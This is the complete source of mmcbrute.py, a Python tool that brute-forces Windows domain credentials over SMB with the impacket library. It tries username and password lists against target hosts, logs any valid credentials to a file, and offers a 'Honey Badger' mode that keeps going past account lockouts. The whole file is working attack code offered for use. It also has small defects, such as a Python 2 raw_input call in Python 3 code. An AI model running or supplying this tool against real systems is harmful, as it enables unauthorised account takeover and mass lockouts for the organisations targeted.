#!/usr/bin/env python3
#
#  mmcbrute.py
#
#  Copyright 2017 Corey Gilks <CoreyGilks [at] gmail [dot] com>
#  Twitter: @CoreyGilks
#
#  2to3 and upgrades contributed by phx (https://github.com/phx)
#  Twitter: @rubynorails
#
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 3 of the License, or
#  (at your option) any later version.
#
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.

import argparse
import datetime
import sys
import os
import pathlib
import logging
import logging.handlers
import time

try:
	from impacket.smbconnection import SMBConnection
except ImportError:
	print('You must install impacket before continuing')
	sys.exit(os.EX_SOFTWARE)

def get_timestamp():
	hmsp = datetime.datetime.now().strftime('%I:%M %p')
	tz = time.strftime('%Z')
	bdy = datetime.datetime.now().strftime('%B %d, %Y')
	return f"{hmsp} {tz} on {bdy}"

def is_readable_file(path):
	return os.path.isfile(path) and os.access(path, os.R_OK)

class MMCBrute(object):
	def __init__(self, usernames, passwords, domain, target, output_log, output_creds,
	             user_as_pass=False, honeybadger=False, verbose=False, loglvl='INFO'):
		self.usernames = open(usernames, 'r')
		self.len_usernames = sum((1 for _ in self.usernames))
		self.usernames.seek(os.SEEK_SET)
		self.domain = domain
		self.target = target
		self.targets = [target]
		self.honeybadger = honeybadger
		self.verbose = verbose
		self.user_as_pass = user_as_pass
		self.output_log = output_log
		self.output_creds = output_creds
		self.logger = logging.getLogger(__name__)
		self.logger.setLevel(loglvl)
		self.formatter = logging.Formatter(f"{datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} - %(message)s")
		self.logfilehandler = logging.handlers.RotatingFileHandler(
			self.output_log,
			maxBytes=10 * 1024 * 1024,
			backupCount=1,
			encoding=None,
			delay=0
		)
		self.consolehandler = logging.StreamHandler()
		self.consolehandler.setLevel(loglvl)
		self.consolehandler.setFormatter(logging.Formatter("%(message)s"))
		self.logfilehandler.setFormatter(self.formatter)
		self.logger.addHandler(self.logfilehandler)
		self.logger.addHandler(self.consolehandler)
		self.count = 0
		self.len_passwords = 0
		self.len_targets = 1

		if passwords is not None:
			self.passwords = open(passwords, 'r')
			self.len_passwords = sum((1 for _ in self.passwords))
			self.passwords.seek(os.SEEK_SET)

		if self.user_as_pass and passwords is not None:
			self.len_passwords += 1
		elif self.user_as_pass:
			self.passwords = False
			self.len_passwords += 1

		if is_readable_file(self.target):
			self.targets = open(self.target, 'r')
			self.len_targets = sum((1 for _ in self.targets))
			self.targets.seek(os.SEEK_SET)

		self.totals = self.len_usernames * self.len_passwords

	@classmethod
	def from_args(cls, args):
		return cls(args.usernames, args.passwords, args.domain, args.target, args.output_log,
		           args.output_creds, args.uap, args.hb, args.verbose, args.loglvl)

	def update_progress(self):
		self.count += 1
		sys.stdout.write(f"\033[93m[+] Progress:\t\t{self.count}/{self.totals} ({round((100 * self.count / self.totals), 2)}%) {' ' * 10}\r\033[0m")
		sys.stdout.flush()

	def write_creds(self, msg=None):
		with open(self.output_creds, 'a') as f:
			f.write(f"{msg}\n")

	def run(self):
		for target in self.targets:
			target = target.strip()
			self.target = target
			smb_connection = SMBConnection(self.target, self.target)
			for user in enumerate(self.usernames):
				user = user[-1].strip()
				if self.user_as_pass:
					self.update_progress()
					next_user = self.login(self.target, self.domain, user, user, smb_connection)
					if next_user:
						# Restablish smb_connection to avoid false positves
						smb_connection.close()
						smb_connection = SMBConnection(self.target, self.target)
						continue
				if self.passwords:
					self.passwords.seek(os.SEEK_SET)
					for password in enumerate(self.passwords):
						password = password[-1].strip()
						self.update_progress()
						next_user = self.login(self.target, self.domain, user, password, smb_connection)
						if next_user:
							# Restablish smb_connection to avoid false positves
							smb_connection.close()
							smb_connection = SMBConnection(self.target, self.target)
							break

	def login(self, target, domain, username, password, smb_connection):
		attempt = f"{domain}/{username}:{password}"
		try:
			# This line will always raise an exception unless the credentials can initiate an smb connection
			smb_connection.login(username, password, domain)
			self.logger.info(f"\033[92m[+] Success (Account Active) on {target}: {attempt}\033[0m")
			self.write_creds(attempt)
			return True

		except Exception as msg:
			msg = str(msg)
			if 'STATUS_NO_LOGON_SERVERS' in msg:
				self.logger.info(f"\033[93m[-] No Logon Servers Available on {target}\033[0m")
				sys.exit(os.EX_SOFTWARE)

			elif 'STATUS_LOGON_FAILURE' in msg:
				if self.verbose:
					self.logger.info(f"\033[91m[-] Failed on {target}: {attempt}\033[0m")
				return False

			elif 'STATUS_ACCOUNT_LOCKED_OUT' in msg:
				self.logger.error(f"\033[93m[-] Account Locked Out on {target}: {attempt}\033[0m")
				if not self.honeybadger:
					self.logger.info(
						'\033[94m[!] Honey Badger mode not enabled. Halting to prevent further lockouts..\033[0m')
					answer = str(raw_input('\033[94m[!] Would you like to proceed with the bruteforce? (Y/N) '))
					if answer.lower() in ["y", "yes", ""]:
						self.logger.info('\033[93m[*] Resuming...')
						return False
					else:
						self.logger.info('\033[91m[-]Exiting...')
						sys.exit(os.EX_SOFTWARE)

			elif 'STATUS_PASSWORD_MUST_CHANGE' in msg:
				self.logger.info(f"\033[92m[+] Success (User never logged in to change password) {attempt}\033[0m")
				self.write_creds(attempt)

			elif 'STATUS_ACCESS_DENIED' in msg or 'STATUS_LOGON_TYPE_NOT_GRANTED' in msg:
				self.logger.info(f"\033[92m[+] Success (Account Active) {attempt}\033[0m")
				self.write_creds(attempt)

			elif 'STATUS_PASSWORD_EXPIRED' in msg:
				self.logger.info(f"\033[92m[+] Success (Password Expired) {attempt}\033[0m")
				self.write_creds(attempt)

			elif 'STATUS_ACCOUNT_DISABLED' in msg:
				self.logger.info(f"\033[91m[-] Valid Password (Account Disabled) {attempt}\033[0m")

			else:
				self.logger.info(f"\033[91m[-] Unknown error: {msg}\t{attempt}\033[0m")
			return True

	def end(self):
		print() # (Cleans up output and log)
		self.logger.info(f"\033[93mFinished at:\t\t{get_timestamp()}\033[0m")
		for f in [self.usernames, self.target, self.passwords]:
			try:
				f.close()
			except AttributeError:
				pass

	def info(self):
		self.logger.info(f"\033[93mStarted at:\t\t{get_timestamp()}\033[0m")
		self.logger.info(f"\033[94mTarget:\t\t\t{self.target}\033[0m")
		self.logger.info(f"\033[94mTarget count:\t\t{self.len_targets}\033[0m")
		self.logger.info(f"\033[94mUsername count:\t\t{self.len_usernames}\033[0m")
		self.logger.info(f"\033[94mPassword count:\t\t{self.len_passwords}\033[0m")
		self.logger.info(f"\033[94mEstimated attempts:\t{self.totals}\033[0m")
		self.logger.info(f"\033[94mUser-as-Pass Mode:\t{self.user_as_pass}\033[0m")
		self.logger.info(f"\033[94mHoney Badger Mode:\t{self.honeybadger}\033[0m")
		self.logger.info(f"\033[94mVerbose Mode:\t\t{self.verbose}\033[0m")

if __name__ == '__main__':
	script_path = os.path.dirname(os.path.abspath(__file__))
	os.chdir(script_path)

	parser = argparse.ArgumentParser(add_help=True, description='Use MMC DCOM to bruteforce valid credentials')
	parser.add_argument('-L', dest='loglvl', action='store', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR', 'CRITICAL'], default='INFO', help='set the logging level')
	group = parser.add_argument_group('Bruteforce options')
	group.add_argument('-t', '--target', action='store', required=True, dest='target', help='Windows domain joined IP address or path to text file containing IPs')
	group.add_argument('-d', '--domain', action='store', default='.', dest='domain', help='Target domain name (same domain you prepend a username with to login)')
	group.add_argument('-p', '--passwords', action='store', dest='passwords', help='Password or path to text file containing passwords')
	group.add_argument('-U', '--user-as-pass', action='store_true', dest='uap', help='Attempt to login with user as pass')
	group.add_argument('-u', '--usernames', action='store', required=True, dest='usernames', help='Path to text file containing usernames')
	group.add_argument('-b', '--honeybadger', action='store_true', dest='hb', help='Enable Honey Badger mode (ignore account locks out)')
	group.add_argument('-o', '--output', action='store', dest='output_log', default='./logs/mmcbrute.log', help='Path to output logfile')
	group.add_argument('-c', '--creds', action='store', dest='output_creds', default='./logs/creds.log', help='Path to output creds file')
	group.add_argument('-v', '--verbose', action='store_true', dest='verbose', help='Show failed bruteforce attempts')
	options = parser.parse_args()
	output_log = options.output_log
	output_creds = options.output_creds

	if options.passwords is None and options.uap is False:
		parser.error('The --passwords or --user-as-pass option is required')

	if not is_readable_file(options.usernames):
		parser.error('The --usernames option must be a readable file')

	if options.passwords is not None and not is_readable_file(options.passwords):
		parser.error('The --passwords option must be a readable file')

	# Make sure logs directory exists:
	pathlib.Path('./logs').mkdir(exist_ok=True)

	brute = MMCBrute.from_args(options)
	try:
		brute.info()
		brute.run()
	except KeyboardInterrupt:
		print('\033[94m\n[*] Caught ctrl-c, exiting')
	finally:
		brute.end()
